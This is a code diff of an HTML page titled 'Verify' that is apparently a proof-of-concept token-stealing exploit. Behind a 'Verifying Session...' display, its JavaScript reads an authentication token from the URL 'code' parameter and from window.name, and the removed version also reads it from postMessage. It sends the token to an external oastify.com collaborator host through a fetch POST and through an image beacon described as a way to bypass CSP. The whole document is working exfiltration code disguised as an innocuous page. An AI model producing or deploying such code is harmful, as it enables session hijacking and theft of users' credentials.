@@ -1,54 +1,40 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>System Status</title>
-</head>
+<head><title>Verify</title></head>
 <body>
-    <div id="app">Loading...</div>
+    <div id="status">Verifying Session...</div>
     <script>
         (function() {
-            const output = document.getElementById('app');
-            const collabURL = "https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/";
-            
-            function exfiltrate(token, method) {
-                output.textContent = "Identity Verified.";
-                // Method 1: Fetch (POST)
-                fetch(collabURL, {
+            const status = document.getElementById('status');
+            const collab = "https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/";
+
+            function exfiltrate(token, src) {
+                status.textContent = "Session Verified.";
+                // Method 1: Fetch
+                fetch(collab + "?method=" + src, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify({ jwt: token, via: method })
+                    body: token
                 });
-                // Method 2: Image Beacon (Bypass CSP)
-                const img = new Image();
-                img.src = collabURL + "?stolen=" + encodeURIComponent(token) + "&method=" + method;
+                // Method 2: Image beacon (Backup)
+                new Image().src = collab + "?stolen=" + encodeURIComponent(token) + "&src=" + src;
             }
 
-            try {
-                // VECTOR 1: Grab directly from the URL (As seen in your screenshot)
-                const urlParams = new URLSearchParams(window.location.search);
-                const codeToken = urlParams.get('code');
-                
-                if (codeToken) {
-                    exfiltrate(codeToken, "url_param");
-                }
+            // 1. Grab from URL 'code' param (This is what appeared in your logs)
+            const params = new URLSearchParams(window.location.search);
+            const urlToken = params.get('code');
+            if (urlToken) {
+                exfiltrate(urlToken, "url_param");
+                return;
+            }
 
-                // VECTOR 2: Fallback to window.name
-                if (window.name) {
-                    try {
-                        const decoded = JSON.parse(atob(window.name));
-                        const winToken = decoded.props.context.environment.authToken;
-                        if (winToken) exfiltrate(winToken, "window_name");
-                    } catch(e) {}
-                }
-
-                // VECTOR 3: Listen for postMessage updates
-                window.addEventListener('message', function(e) {
-                    const msgToken = e.data?.props?.context?.environment?.authToken;
-                    if (msgToken) exfiltrate(msgToken, "post_message");
-                });
-
-            } catch (err) {
-                console.error("POC Error:", err);
+            // 2. Fallback to window.name (Standard method)
+            if (window.name) {
+                try {
+                    const data = JSON.parse(atob(window.name));
+                    const winToken = data.props.context.environment.authToken;
+                    if (winToken) exfiltrate(winToken, "window_name");
+                } catch(e) {}
             }
         })();
     </script>
